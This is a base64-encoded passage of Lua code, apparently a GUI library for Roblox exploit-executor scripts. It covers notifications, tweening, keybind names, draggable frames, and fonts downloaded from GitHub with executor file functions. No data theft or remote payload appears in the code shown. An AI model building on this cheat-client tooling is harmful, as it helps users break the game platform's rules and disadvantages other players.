fb2Zmc2V0KDIwLCBvZmZzZXQpCgogICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGl0ZW1zWyAibm90aWZpY2F0aW9uIiBdLCB7QW5jaG9yUG9pbnQgPSB2ZWMyKDAsIDApfSwgRW51bS5FYXNpbmdTdHlsZS5RdWFkLCAxKQogICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGl0ZW1zWyAiYmFyIiBdLCB7U2l6ZSA9IGRpbTIoMSwgLTgsIDAsIDUpfSwgRW51bS5FYXNpbmdTdHlsZS5RdWFkLCBjZmcubGlmZXRpbWUpCgogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHRhc2sud2FpdChjZmcubGlmZXRpbWUpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIG5vdGlmaWNhdGlvbnMubm90aWZzW2luZGV4XSA9IG5pbAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBub3RpZmljYXRpb25zOmZhZGUoaXRlbXNbICJub3RpZmljYXRpb24iIF0sIHRydWUpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4oaXRlbXNbICJub3RpZmljYXRpb24iIF0sIHtBbmNob3JQb2ludCA9IHZlYzIoMSwgMCl9LCBFbnVtLkVhc2luZ1N0eWxlLlF1YWQsIDEpCgogICAgICAgICAgICAgICAgdGFzay53YWl0KDEpCiAgICAgICAgCiAgICAgICAgICAgICAgICBpdGVtc1sgIm5vdGlmaWNhdGlvbiIgXTpEZXN0cm95KCkgCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQKICAgIGVuZAplbHNlCiAgICAgICAgICAgIC0tTFBIX0pJVF9NQVgoZnVuY3Rpb24oKQoKLS0gVmFyaWFibGVzCiAgICBsb2NhbCBzY2FsZSA9IDAuNQogICAgbG9jYWwgdWlzID0gU2VydmljZXMuVXNlcklucHV0U2VydmljZQogICAgbG9jYWwgcGxheWVycyA9IFNlcnZpY2VzLlBsYXllcnMKICAgIGxvY2FsIHdzID0gU2VydmljZXMuV29ya3NwYWNlCiAgICBsb2NhbCBycyA9IFNlcnZpY2VzLlJlcGxpY2F0ZWRTdG9yYWdlCiAgICBsb2NhbCBodHRwX3NlcnZpY2UgPSBTZXJ2aWNlcy5IdHRwU2VydmljZQogICAgbG9jYWwgZ3VpX3NlcnZpY2UgPSBTZXJ2aWNlcy5HdWlTZXJ2aWNlCiAgICBsb2NhbCBsaWdodGluZyA9IFNlcnZpY2VzLkxpZ2h0aW5nCiAgICBsb2NhbCBydW4gPSBTZXJ2aWNlcy5SdW5TZXJ2aWNlCiAgICBsb2NhbCBzdGF0cyA9IFNlcnZpY2VzLlN0YXRzCiAgICBsb2NhbCBjb3JlZ3VpID0gU2VydmljZXMuQ29yZUd1aQogICAgbG9jYWwgZGVicmlzID0gU2VydmljZXMuRGVicmlzCiAgICBsb2NhbCB0d2Vlbl9zZXJ2aWNlID0gU2VydmljZXMuVHdlZW5TZXJ2aWNlCiAgICBsb2NhbCBzb3VuZF9zZXJ2aWNlID0gU2VydmljZXMuU291bmRTZXJ2aWNlCiAgICBsb2NhbCBydW5fc2VydmljZSA9IFNlcnZpY2VzLlJ1blNlcnZpY2UKCiAgICBsb2NhbCB2ZWMyID0gVmVjdG9yMi5uZXcKICAgIGxvY2FsIHZlYzMgPSBWZWN0b3IzLm5ldwogICAgbG9jYWwgZGltMiA9IFVEaW0yLm5ldwogICAgbG9jYWwgZGltID0gVURpbS5uZXcgCiAgICBsb2NhbCByZWN0ID0gUmVjdC5uZXcKICAgIGxvY2FsIGNmciA9IENGcmFtZS5uZXcKICAgIGxvY2FsIGVtcHR5X2NmciA9IGNmcigpCiAgICBsb2NhbCBwb2ludF9vYmplY3Rfc3BhY2UgPSBlbXB0eV9jZnIuUG9pbnRUb09iamVjdFNwYWNlCiAgICBsb2NhbCBhbmdsZSA9IENGcmFtZS5BbmdsZXMKICAgIGxvY2FsIGRpbV9vZmZzZXQgPSBVRGltMi5mcm9tT2Zmc2V0CgogICAgbG9jYWwgY29sb3IgPSBDb2xvcjMubmV3CiAgICBsb2NhbCByZ2IgPSBDb2xvcjMuZnJvbVJHQgogICAgbG9jYWwgaGV4ID0gQ29sb3IzLmZyb21IZXgKICAgIGxvY2FsIGhzdiA9IENvbG9yMy5mcm9tSFNWCiAgICBsb2NhbCByZ2JzZXEgPSBDb2xvclNlcXVlbmNlLm5ldwogICAgbG9jYWwgcmdia2V5ID0gQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldwogICAgbG9jYWwgbnVtc2VxID0gTnVtYmVyU2VxdWVuY2UubmV3CiAgICBsb2NhbCBudW1rZXkgPSBOdW1iZXJTZXF1ZW5jZUtleXBvaW50Lm5ldwoKICAgIGxvY2FsIGNhbWVyYSA9IHdzLkN1cnJlbnRDYW1lcmEKICAgIGxvY2FsIGxwID0gcGxheWVycy5Mb2NhbFBsYXllciAKICAgIGxvY2FsIG1vdXNlID0gbHA6R2V0TW91c2UoKSAKICAgIGxvY2FsIGd1aV9vZmZzZXQgPSBndWlfc2VydmljZTpHZXRHdWlJbnNldCgpLlkKCiAgICBsb2NhbCBtYXggPSBtYXRoLm1heCAKICAgIGxvY2FsIGZsb29yID0gbWF0aC5mbG9vciAKICAgIGxvY2FsIG1pbiA9IG1hdGgubWluIAogICAgbG9jYWwgYWJzID0gbWF0aC5hYnMgCiAgICBsb2NhbCBub2lzZSA9IG1hdGgubm9pc2UKICAgIGxvY2FsIHJhZCA9IG1hdGgucmFkIAogICAgbG9jYWwgcmFuZG9tID0gbWF0aC5yYW5kb20gCiAgICBsb2NhbCBwb3cgPSBtYXRoLnBvdyAKICAgIGxvY2FsIHNpbiA9IG1hdGguc2luIAogICAgbG9jYWwgcGkgPSBtYXRoLnBpIAogICAgbG9jYWwgdGFuID0gbWF0aC50YW4gCiAgICBsb2NhbCBhdGFuMiA9IG1hdGguYXRhbjIgCiAgICBsb2NhbCBjbGFtcCA9IG1hdGguY2xhbXAgCgogICAgbG9jYWwgaW5zZXJ0ID0gdGFibGUuaW5zZXJ0IAogICAgbG9jYWwgZmluZCA9IHRhYmxlLmZpbmQgCiAgICBsb2NhbCByZW1vdmUgPSB0YWJsZS5yZW1vdmUKICAgIGxvY2FsIGNvbmNhdCA9IHRhYmxlLmNvbmNhdAotLSAKCi0tIExpYnJhcnkgaW5pCgogICAgbG9jYWwgdGhlbWVzID0gewogICAgICAgIHByZXNldCA9IHsKICAgICAgICAgICAgYWNjZW50ID0gcmdiKDI1NSwyNTUsMjU1KSwKICAgICAgICB9LCAKCiAgICAgICAgdXRpbGl0eSA9IHsKICAgICAgICAgICAgYWNjZW50ID0gewogICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHt9LCAJCiAgICAgICAgICAgICAgICBUZXh0Q29sb3IzID0ge30sIAogICAgICAgICAgICAgICAgSW1hZ2VDb2xvcjMgPSB7fSwgCiAgICAgICAgICAgICAgICBTY3JvbGxCYXJJbWFnZUNvbG9yMyA9IHt9IAogICAgICAgICAgICB9LAogICAgICAgIH0KICAgIH0KCiAgICBsb2NhbCBrZXlzID0gewogICAgICAgIFtFbnVtLktleUNvZGUuTGVmdFNoaWZ0XSA9ICJMUyIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5SaWdodFNoaWZ0XSA9ICJSUyIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5MZWZ0Q29udHJvbF0gPSAiTEMiLAogICAgICAgIFtFbnVtLktleUNvZGUuUmlnaHRDb250cm9sXSA9ICJSQyIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5JbnNlcnRdID0gIklOUyIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5CYWNrc3BhY2VdID0gIkJTIiwKICAgICAgICBbRW51bS5LZXlDb2RlLlJldHVybl0gPSAiRW50IiwKICAgICAgICBbRW51bS5LZXlDb2RlLkxlZnRBbHRdID0gIkxBIiwKICAgICAgICBbRW51bS5LZXlDb2RlLlJpZ2h0QWx0XSA9ICJSQSIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5DYXBzTG9ja10gPSAiQ0FQUyIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5PbmVdID0gIjEiLAogICAgICAgIFtFbnVtLktleUNvZGUuVHdvXSA9ICIyIiwKICAgICAgICBbRW51bS5LZXlDb2RlLlRocmVlXSA9ICIzIiwKICAgICAgICBbRW51bS5LZXlDb2RlLkZvdXJdID0gIjQiLAogICAgICAgIFtFbnVtLktleUNvZGUuRml2ZV0gPSAiNSIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5TaXhdID0gIjYiLAogICAgICAgIFtFbnVtLktleUNvZGUuU2V2ZW5dID0gIjciLAogICAgICAgIFtFbnVtLktleUNvZGUuRWlnaHRdID0gIjgiLAogICAgICAgIFtFbnVtLktleUNvZGUuTmluZV0gPSAiOSIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5aZXJvXSA9ICIwIiwKICAgICAgICBbRW51bS5LZXlDb2RlLktleXBhZE9uZV0gPSAiTnVtMSIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5LZXlwYWRUd29dID0gIk51bTIiLAogICAgICAgIFtFbnVtLktleUNvZGUuS2V5cGFkVGhyZWVdID0gIk51bTMiLAogICAgICAgIFtFbnVtLktleUNvZGUuS2V5cGFkRm91cl0gPSAiTnVtNCIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5LZXlwYWRGaXZlXSA9ICJOdW01IiwKICAgICAgICBbRW51bS5LZXlDb2RlLktleXBhZFNpeF0gPSAiTnVtNiIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5LZXlwYWRTZXZlbl0gPSAiTnVtNyIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5LZXlwYWRFaWdodF0gPSAiTnVtOCIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5LZXlwYWROaW5lXSA9ICJOdW05IiwKICAgICAgICBbRW51bS5LZXlDb2RlLktleXBhZFplcm9dID0gIk51bTAiLAogICAgICAgIFtFbnVtLktleUNvZGUuTWludXNdID0gIi0iLAogICAgICAgIFtFbnVtLktleUNvZGUuRXF1YWxzXSA9ICI9IiwKICAgICAgICBbRW51bS5LZXlDb2RlLlRpbGRlXSA9ICJ+IiwKICAgICAgICBbRW51bS5LZXlDb2RlLkxlZnRCcmFja2V0XSA9ICJbIiwKICAgICAgICBbRW51bS5LZXlDb2RlLlJpZ2h0QnJhY2tldF0gPSAiXSIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5SaWdodFBhcmVudGhlc2lzXSA9ICIpIiwKICAgICAgICBbRW51bS5LZXlDb2RlLkxlZnRQYXJlbnRoZXNpc10gPSAiKCIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5TZW1pY29sb25dID0gIiwiLAogICAgICAgIFtFbnVtLktleUNvZGUuUXVvdGVdID0gIiciLAogICAgICAgIFtFbnVtLktleUNvZGUuQmFja1NsYXNoXSA9ICJcXCIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5Db21tYV0gPSAiLCIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5QZXJpb2RdID0gIi4iLAogICAgICAgIFtFbnVtLktleUNvZGUuU2xhc2hdID0gIi8iLAogICAgICAgIFtFbnVtLktleUNvZGUuQXN0ZXJpc2tdID0gIioiLAogICAgICAgIFtFbnVtLktleUNvZGUuUGx1c10gPSAiKyIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5QZXJpb2RdID0gIi4iLAogICAgICAgIFtFbnVtLktleUNvZGUuQmFja3F1b3RlXSA9ICJgIiwKICAgICAgICBbRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlQnV0dG9uMV0gPSAiTUIxIiwKICAgICAgICBbRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlQnV0dG9uMl0gPSAiTUIyIiwKICAgICAgICBbRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlQnV0dG9uM10gPSAiTUIzIiwKICAgICAgICBbRW51bS5LZXlDb2RlLkVzY2FwZV0gPSAiRVNDIiwKICAgICAgICBbRW51bS5LZXlDb2RlLlNwYWNlXSA9ICJTUEMiLAogICAgfQogICAgICAgIAogICAgbGlicmFyeS5fX2luZGV4ID0gbGlicmFyeQoKICAgIGZvciBfLCBwYXRoIGluIG5leHQsIGxpYnJhcnkuZm9sZGVycyBkbyAKICAgICAgICBtYWtlZm9sZGVyKGxpYnJhcnkuZGlyZWN0b3J5IC4uIHBhdGgpCiAgICBlbmQKCiAgICBsb2NhbCBmbGFncyA9IGxpYnJhcnkuZmxhZ3MgCiAgICBsb2NhbCBjb25maWdfZmxhZ3MgPSBsaWJyYXJ5LmNvbmZpZ19mbGFncwogICAgbG9jYWwgbm90aWZpY2F0aW9ucyA9IGxpYnJhcnkubm90aWZpY2F0aW9ucyAKCiAgICBsb2NhbCBmb250cyA9IHt9OyBkbwogICAgICAgIGZ1bmN0aW9uIFJlZ2lzdGVyX0ZvbnQoTmFtZSwgV2VpZ2h0LCBTdHlsZSwgQXNzZXQpCiAgICAgICAgICAgIGlmIG5vdCBpc2ZpbGUoQXNzZXQuSWQpIHRoZW4KICAgICAgICAgICAgICAgIHdyaXRlZmlsZShBc3NldC5JZCwgQXNzZXQuRm9udCkKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBpZiBpc2ZpbGUoTmFtZSAuLiAiLmZvbnQiKSB0aGVuCiAgICAgICAgICAgICAgICBkZWxmaWxlKE5hbWUgLi4gIi5mb250IikKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBsb2NhbCBEYXRhID0gewogICAgICAgICAgICAgICAgbmFtZSA9IE5hbWUsCiAgICAgICAgICAgICAgICBmYWNlcyA9IHsKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgPSAiTm9ybWFsIiwKICAgICAgICAgICAgICAgICAgICAgICAgd2VpZ2h0ID0gV2VpZ2h0LAogICAgICAgICAgICAgICAgICAgICAgICBzdHlsZSA9IFN0eWxlLAogICAgICAgICAgICAgICAgICAgICAgICBhc3NldElkID0gZ2V0Y3VzdG9tYXNzZXQoQXNzZXQuSWQpLAogICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICB9CgogICAgICAgICAgICB3cml0ZWZpbGUoTmFtZSAuLiAiLmZvbnQiLCBodHRwX3NlcnZpY2U6SlNPTkVuY29kZShEYXRhKSkKCiAgICAgICAgICAgIHJldHVybiBnZXRjdXN0b21hc3NldChOYW1lIC4uICIuZm9udCIpOwogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIGxvY2FsIE1lZGl1bSA9IFJlZ2lzdGVyX0ZvbnQoIk1lYXdkYXdkYXdkZGl1bSIsIDIwMCwgIk5vcm1hbCIsIHsKICAgICAgICAgICAgSWQgPSAiTWVkaXVtYXdkd2FkLnR0ZiIsCiAgICAgICAgICAgIEZvbnQgPSBnYW1lOkh0dHBHZXQoImh0dHBzOi8vZ2l0aHViLmNvbS9pNzdsaG0vc3RvcmFnZS9yYXcvcmVmcy9oZWFkcy9tYWluL2ZvbnRzL0ludGVyXzI4cHQtTWVkaXVtLnR0ZiIpLAogICAgICAgIH0pCgogICAgICAgIGxvY2FsIFNlbWlCb2xkID0gUmVnaXN0ZXJfRm9udCgiU2Vhd2Rhd2Rhd2Rhd2RtaUJvbGQiLCAyMDAsICJOb3JtYWwiLCB7CiAgICAgICAgICAgIElkID0gIlNlbWlCb2xkYXdkYXdkd2FkLnR0ZiIsCiAgICAgICAgICAgIEZvbnQgPSBnYW1lOkh0dHBHZXQoImh0dHBzOi8vZ2l0aHViLmNvbS9pNzdsaG0vc3RvcmFnZS9yYXcvcmVmcy9oZWFkcy9tYWluL2ZvbnRzL0ludGVyXzI4cHQtU2VtaUJvbGQudHRmIiksCiAgICAgICAgfSkKCiAgICAgICAgZm9udHMgPSB7CiAgICAgICAgICAgIHNtYWxsID0gRm9udC5uZXcoTWVkaXVtLCBFbnVtLkZvbnRXZWlnaHQuUmVndWxhciwgRW51bS5Gb250U3R5bGUuTm9ybWFsKTsKICAgICAgICAgICAgZm9udCA9IEZvbnQubmV3KFNlbWlCb2xkLCBFbnVtLkZvbnRXZWlnaHQuUmVndWxhciwgRW51bS5Gb250U3R5bGUuTm9ybWFsKTsKICAgICAgICB9CiAgICBlbmQKLS0KCi0tIExpYnJhcnkgZnVuY3Rpb25zIAogICAgLS0gTWlzYyBmdW5jdGlvbnMKICAgICAgICBmdW5jdGlvbiBsaWJyYXJ5OnR3ZWVuKG9iaiwgcHJvcGVydGllcywgZWFzaW5nX3N0eWxlLCB0aW1lKSAKICAgICAgICAgICAgbG9jYWwgdHdlZW4gPSB0d2Vlbl9zZXJ2aWNlOkNyZWF0ZShvYmosIFR3ZWVuSW5mby5uZXcodGltZSBvciAwLjI1LCBlYXNpbmdfc3R5bGUgb3IgRW51bS5FYXNpbmdTdHlsZS5RdWludCwgRW51bS5FYXNpbmdEaXJlY3Rpb24uSW5PdXQsIDAsIGZhbHNlLCAwKSwgcHJvcGVydGllcyk6UGxheSgpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgcmV0dXJuIHR3ZWVuCiAgICAgICAgZW5kCgogICAgICAgIGZ1bmN0aW9uIGxpYnJhcnk6cmVzaXppZnkoZnJhbWUpIAogICAgICAgICAgICBsb2NhbCBGcmFtZSA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgICAgIEZyYW1lLlBvc2l0aW9uID0gZGltMigxLCAtMTAsIDEsIC0xMCkKICAgICAgICAgICAgRnJhbWUuQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApCiAgICAgICAgICAgIEZyYW1lLlNpemUgPSBkaW0yKDAsIDEwLCAwLCAxMCkKICAgICAgICAgICAgRnJhbWUuQm9yZGVyU2l6ZVBpeGVsID0gMAogICAgICAgICAgICBGcmFtZS5CYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgIEZyYW1lLlBhcmVudCA9IGZyYW1lCiAgICAgICAgICAgIEZyYW1lLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxIAogICAgICAgICAgICBGcmFtZS5UZXh0ID0gIiIKCiAgICAgICAgICAgIGxvY2FsIHJlc2l6aW5nID0gZmFsc2UgCiAgICAgICAgICAgIGxvY2FsIHN0YXJ0X3NpemUgCiAgICAgICAgICAgIGxvY2FsIHN0YXJ0IAogICAgICAgICAgICBsb2NhbCBvZ19zaXplID0gZnJhbWUuU2l6ZSAgCgogICAgICAgICAgICBGcmFtZS5JbnB1dEJlZ2FuOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQpCiAgICAgICAgICAgICAgICBpZiBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Ub3VjaCB0aGVuCiAgICAgICAgICAgICAgICAgICAgcmVzaXppbmcgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgc3RhcnQgPSBpbnB1dC5Qb3NpdGlvbgogICAgICAgICAgICAgICAgICAgIHN0YXJ0X3NpemUgPSBmcmFtZS5TaXplCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgRnJhbWUuSW5wdXRFbmRlZDpDb25uZWN0KGZ1bmN0aW9uKGlucHV0KQogICAgICAgICAgICAgICAgaWYgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuVG91Y2ggdGhlbgogICAgICAgICAgICAgICAgICAgIHJlc2l6aW5nID0gZmFsc2UKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICBsaWJyYXJ5OmNvbm5lY3Rpb24odWlzLklucHV0Q2hhbmdlZCwgZnVuY3Rpb24oaW5wdXQsIGdhbWVfZXZlbnQpIAogICAgICAgICAgICAgICAgaWYgcmVzaXppbmcgYW5kIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLlRvdWNoIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCB2aWV3cG9ydF94ID0gY2FtZXJhLlZpZXdwb3J0U2l6ZS5YCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmlld3BvcnRfeSA9IGNhbWVyYS5WaWV3cG9ydFNpemUuWQoKICAgICAgICAgICAgICAgICAgICBsb2NhbCBjdXJyZW50X3NpemUgPSBkaW0yKAogICAgICAgICAgICAgICAgICAgICAgICBzdGFydF9zaXplLlguU2NhbGUsCiAgICAgICAgICAgICAgICAgICAgICAgIG1hdGguY2xhbXAoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGFydF9zaXplLlguT2Zmc2V0ICsgKGlucHV0LlBvc2l0aW9uLlggLSBzdGFydC5YKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9nX3NpemUuWC5PZmZzZXQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2aWV3cG9ydF94CiAgICAgICAgICAgICAgICAgICAgICAgICksCiAgICAgICAgICAgICAgICAgICAgICAgIHN0YXJ0X3NpemUuWS5TY2FsZSwKICAgICAgICAgICAgICAgICAgICAgICAgbWF0aC5jbGFtcCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXJ0X3NpemUuWS5PZmZzZXQgKyAoaW5wdXQuUG9zaXRpb24uWSAtIHN0YXJ0LlkpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgb2dfc2l6ZS5ZLk9mZnNldCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZpZXdwb3J0X3kKICAgICAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgICAgICkKCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihmcmFtZSwge1NpemUgPSBjdXJyZW50X3NpemV9LCBFbnVtLkVhc2luZ1N0eWxlLkxpbmVhciwgMC4wNSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kIAoKICAgICAgICBmdW5jdGlvbiBmYWcodGJsKQogICAgICAgICAgICBsb2NhbCBTaXplID0gMAogICAgICAgICAgICAKICAgICAgICAgICAgZm9yIF8gaW4gdGJsIGRvCiAgICAgICAgICAgICAgICBTaXplID0gU2l6ZSArIDEKICAgICAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgICAgIHJldHVybiBTaXplCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgZnVuY3Rpb24gbGlicmFyeTpuZXh0X2ZsYWcoKQogICAgICAgICAgICBsb2NhbCBpbmRleCA9IGZhZyhsaWJyYXJ5LmZsYWdzKSArIDE7CiAgICAgICAgICAgIGxvY2FsIHN0ciA9IHN0cmluZy5mb3JtYXQoImZsYWdudW1iZXIlcyIsIGluZGV4KQogICAgICAgICAgICAKICAgICAgICAgICAgcmV0dXJuIHN0cjsKICAgICAgICBlbmQgCgogICAgICAgIGZ1bmN0aW9uIGxpYnJhcnk6bW91c2VfaW5fZnJhbWUodWlvYmplY3QpCiAgICAgICAgICAgIGxvY2FsIHlfY29uZCA9IHVpb2JqZWN0LkFic29sdXRlUG9zaXRpb24uWSA8PSBtb3VzZS5ZIGFuZCBtb3VzZS5ZIDw9IHVpb2JqZWN0LkFic29sdXRlUG9zaXRpb24uWSArIHVpb2JqZWN0LkFic29sdXRlU2l6ZS5ZCiAgICAgICAgICAgIGxvY2FsIHhfY29uZCA9IHVpb2JqZWN0LkFic29sdXRlUG9zaXRpb24uWCA8PSBtb3VzZS5YIGFuZCBtb3VzZS5YIDw9IHVpb2JqZWN0LkFic29sdXRlUG9zaXRpb24uWCArIHVpb2JqZWN0LkFic29sdXRlU2l6ZS5YCgogICAgICAgICAgICByZXR1cm4gKHlfY29uZCBhbmQgeF9jb25kKQogICAgICAgIGVuZAoKICAgICAgICBmdW5jdGlvbiBsaWJyYXJ5OmRyYWdnaWZ5KGZyYW1lKQogICAgICAgICAgICBsb2NhbCBkcmFnZ2luZyA9IGZhbHNlIAogICAgICAgICAgICBsb2NhbCBzdGFydF9zaXplID0gZnJhbWUuUG9zaXRpb24KICAgICAgICAgICAgbG9jYWwgc3RhcnQgCgogICAgICAgICAgICBmcmFtZS5JbnB1dEJlZ2FuOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQpCiAgICAgICAgICAgICAgICBpZiBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Ub3VjaCB0aGVuCiAgICAgICAgICAgICAgICAgICAgZHJhZ2dpbmcgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgc3RhcnQgPSBpbnB1dC5Qb3NpdGlvbgogICAgICAgICAgICAgICAgICAgIHN0YXJ0X3NpemUgPSBmcmFtZS5Qb3NpdGlvbgogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIGZyYW1lLklucHV0RW5kZWQ6Q29ubmVjdChmdW5jdGlvbihpbnB1dCkKICAgICAgICAgICAgICAgIGlmIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLlRvdWNoIHRoZW4KICAgICAgICAgICAgICAgICAgICBkcmFnZ2luZyA9IGZhbHNlCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgbGlicmFyeTpjb25uZWN0aW9uKHVpcy5JbnB1dENoYW5nZWQsIGZ1bmN0aW9uKGlucHV0LCBnYW1lX2V2ZW50KSAKICAgICAgICAgICAgICAgIGlmIGRyYWdnaW5nIGFuZCBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Ub3VjaCB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmlld3BvcnRfeCA9IGNhbWVyYS5WaWV3cG9ydFNpemUuWAogICAgICAgICAgICAgICAgICAgIGxvY2FsIHZpZXdwb3J0X3kgPSBjYW1lcmEuVmlld3BvcnRTaXplLlkKCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgY3VycmVudF9wb3NpdGlvbiA9IGRpbTIoCiAgICAgICAgICAgICAgICAgICAgICAgIDAsCiAgICAgICAgICAgICAgICAgICAgICAgIHN0YXJ0X3NpemUuWC5PZmZzZXQgKyAoaW5wdXQuUG9zaXRpb24uWCAtIHN0YXJ0LlgpLAogICAgICAgICAgICAgICAgICAgICAgICAwLAogICAgICAgICAgICAgICAgICAgICAgICBzdGFydF9zaXplLlkuT2Zmc2V0ICsgKGlucHV0LlBvc2l0aW9uLlkgLSBzdGFydC5ZKQogICAgICAgICAgICAgICAgICAgICkKCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihmcmFtZSwge1Bvc2l0aW9uID0gY3VycmVudF9wb3NpdGlvbn0sIEVudW0uRWFzaW5nU3R5bGUuTGluZWFyLCAwLjA1KQogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y2xvc2VfZWxlbWVudCgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZCAKCiAgICAgICAgZnVuY3Rpb24gbGlicmFyeTpjb252ZXJ0KHN0cikKICAgICAgICAgICAgbG9jYWwgdmFsdWVzID0ge30KCiAgICAgICAgICAgIGZvciB2YWx1ZSBpbiBzdHJpbmcuZ21hdGNoKHN0ciwgIlteLF0rIikgZG8KICAgICAgICAgICAgICAgIGluc2VydCh2YWx1ZXMsIHRvbnVtYmVyKHZhbHVlKSkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiAjdmFsdWVzID09IDQgdGhlbiAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICByZXR1cm4gdW5wYWNrKHZhbHVlcykKICAgICAgICAgICAgZWxzZSAKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBmdW5jdGlvbiBsaWJyYXJ5OmNvbnZlcnRfZW51bShlbnVtKQogICAgICAgICAgICBsb2NhbCBlbnVtX3BhcnRzID0ge30KICAgICAgICAKICAgICAgICAgICAgZm9yIHBhcnQgaW4gc3RyaW5nLmdtYXRjaChlbnVtLCAiWyV3X10rIikgZG8KICAgICAgICAgICAgICAgIGluc2VydChlbnVtX3BhcnRzLCBwYXJ0KQogICAgICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAgICAgbG9jYWwgZW51bV90YWJsZSA9IEVudW0KICAgICAgICAgICAgZm9yIGkgPSAyLCAjZW51bV9wYXJ0cyBkbwogICAgICAgICAgICAgICAgbG9jYWwgZW51bV9pdGVtID0gZW51bV90YWJsZVtlbnVtX3BhcnRzW2ldXQogICAgICAgIAogICAgICAgICAgICAgICAgZW51bV90YWJsZSA9IGVudW1faXRlbQogICAgICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAgICAgcmV0dXJuIGVudW1fdGFibGUKICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgY29uZmlnX2hvbGRlcjsKICAgICAgICBmdW5jdGlvbiBsaWJyYXJ5OnVwZGF0ZV9jb25maWdfbGlzdCgpIAogICAgICAgICAgICBpZiBub3QgY29uZmlnX2hvbGRlciB0aGVuIAogICAgICAgICAgICAgICAgcmV0dXJuIAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIGxpc3QgPSB7fQogICA